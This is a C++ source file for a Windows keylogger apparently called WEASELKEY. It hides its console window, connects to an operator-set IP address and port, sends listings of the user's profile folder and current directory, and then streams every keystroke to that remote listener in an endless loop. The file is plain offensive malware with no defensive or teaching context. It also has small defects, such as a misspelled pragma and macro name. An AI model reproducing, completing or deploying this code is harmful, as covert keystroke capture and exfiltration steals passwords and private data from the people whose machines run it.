#define _WINDSOCK_DEPRECATED_NO_WARNINGS
#pragma commet (lib, "Ws2_32.lib") 

#include <iostream>
#include <dirent.h>
#include <winsock2.h>
using namespace std;

int main ()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	char KEY;
	
	WSADATA WSAData; 
	
	SOCKET server; 
	SOCKADDR_IN addr;
	
	WSAStartup(MAKEWORD(2, 0), &WSAData);
	
	server = socket (AF_INET, SOCK_STREAM, 0);
	
	addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Set this to your the ip address you want to receive data.
	
	addr.sin_family = AF_INET;
	
	addr.sin_port = htons(5555); // Set this to the port you are listening on at the above ip address.
	
	connect (server, (SOCKADDR *)&addr, sizeof(addr));
	
	char banner[35] = "\n_# WEASELKEY version 0.0 #_\n\n";
	send(server, banner, sizeof(banner), 0);
		
	//Declare some variables for directories info. 
	DIR *dr;
	DIR *dr2;
	char* path;
	struct dirent *ent;// new var named ent: pointer to structure
	char directory[200];
	struct dirent *en;
	
	// Gather possible useful enviromental variables. 
	path = getenv("USERPROFILE");
	
	// Send current users path.
	if ((dr = opendir (path)) !=NULL){
		char envpath[15] = "#USER PATH#\n";
		send(server, envpath, sizeof(envpath), 0);
		while ((ent =readdir(dr)) !=NULL){
			send(server, ent->d_name, sizeof(ent->d_name), 0);
			send(server, "\n", sizeof(2), 0);
		}
	}
	  closedir(dr); //close all directory
	  
	// Send current directory.  
	if ((dr2 = opendir (".")) !=NULL){
		char currentdir[25] = "\n#CURRENT DIRECTORY#\n";
		send(server, currentdir, sizeof(currentdir), 0);
		while ((ent =readdir(dr2)) !=NULL){
			send(server, ent->d_name, sizeof(ent->d_name), 0);
			send(server, "\n", sizeof(2), 0);
		}
	}
	  closedir(dr2); //close all directory
	
	
	// Key collection and sending. 
	while (true) {
		Sleep(10);
		for (int KEY =0x8; KEY < 0xFF; KEY++) // Check if the key is printable. 
		{
			if (GetAsyncKeyState(KEY) == -32767){
				char buffer[2]; // declare the var that will the pressed key. 
				buffer[0] = KEY; //insert the key into the variable.
				send(server, buffer, sizeof(buffer), 0); //send data over the network.
			}
		}
	
	}
	
   closesocket(server); //close the socket
   WSACleanup(); //clean up the Winsock library components
   return(0);	
}
